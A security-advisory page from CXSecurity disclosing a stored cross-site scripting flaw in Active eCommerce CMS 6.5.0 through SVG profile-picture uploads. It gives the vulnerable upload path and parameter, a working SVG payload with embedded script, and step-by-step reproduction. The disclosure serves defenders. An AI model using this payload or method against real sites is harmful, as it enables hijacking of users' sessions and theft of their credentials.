---
title: Active eCommerce CMS 6.5.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023010041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-24
fetch_date: 2025-10-04T04:37:45.488350
---

# Active eCommerce CMS 6.5.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Active eCommerce CMS 6.5.0 Cross Site Scripting** **2023.01.23**  Credit:  **[Sajibe Kanti](https://cxsecurity.com/author/Sajibe%2BKanti/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Active eCommerce CMS 6.5.0 - 'svg' Stored Cross-Site
Scripting (XSS)
# Date: 19/01/2023
# Exploit Author: Sajibe Kanti
# Vendor Name: ActiveITzone
# Vendor Homepage: https://activeitzone.com/
# Software Link: https://codecanyon.net/item/active-ecommerce-cms/23471405
# Version: 6.5.0
# Tested on: Live ( Centos & Litespeed Web Server)
# Demo Link : https://demo.activeitzone.com/ecommerce/
# Description #
The Active eCommerce CMS 6.5.0 application has a vulnerability in the
profile picture upload feature that allows for stored cross-site scripting
(XSS) attacks. Specifically, the vulnerability lies in the handling of
"svg" image files, which can contain malicious code. An attacker can
exploit this vulnerability by uploading a specially crafted "svg" image
file as a profile picture, which will then be executed by the application
when the user views the profile. This can allow the attacker to steal
sensitive information, such as login credentials, or to perform other
malicious actions on the user's behalf. This vulnerability highlights the
importance of proper input validation and image file handling in web
application development.
# Exploit Details #
# Vulnerable Path : /aiz-uploader/upload
# Parameter: files (POST)
# Vector: <svg version="1.1" baseProfile="full" xmlns="
http://www.w3.org/2000/svg">
<rect width="300" height="100"
style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert("haha XSS");
</script>
</svg>
# Proof of Concept (PoC) : Exploit #
1) Goto: https://localhost
2) Click Registration
3) Login Your Account
4) Go Manage Profile
5) Now Upload Given Vector as anyname.svg (you must put vector code in
anyname.svg file)
6) After Upload Clic to view Your profile picture
7) XSS Popup Will Fired
# Image PoC : Reference Image #
1) Payload Fired: https://prnt.sc/cW0F\_BtpyMcv

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top